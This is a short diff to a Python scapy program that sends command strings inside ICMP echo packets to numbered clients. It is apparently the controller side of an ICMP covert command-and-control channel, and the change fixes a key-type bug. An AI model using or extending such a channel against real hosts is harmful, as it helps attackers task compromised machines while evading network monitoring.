@@ -44,12 +44,11 @@ def main():
             clientcommand = arguments[1] 
             clienttokens = clientcommand.split(" ", 1)
             if clients.get(int(clienttokens[0])) != None:
-                evil = IP(dst=clients.get(str(clienttokens[0])))/ICMP(type=8)/(clienttokens[1])
+                evil = IP(dst=clients.get(int(clienttokens[0])))/ICMP(type=8)/(clienttokens[1])
                 send(evil)
                 if DEBUG: print(f"[DEBUG] \"{clienttokens[1]}\" sent to {clienttokens[0]} at {clients.get(int(clienttokens[0]))}")
             else:
                 print(f"[ERROR] No client at ID {clienttokens[0]}")
-                evil = IP(dst=clients.get(int(clienttokens[0])))/ICMP(type=8)/(clienttokens[1])
 
         elif arguments[0] == "sendtoall":
             for client in clients:
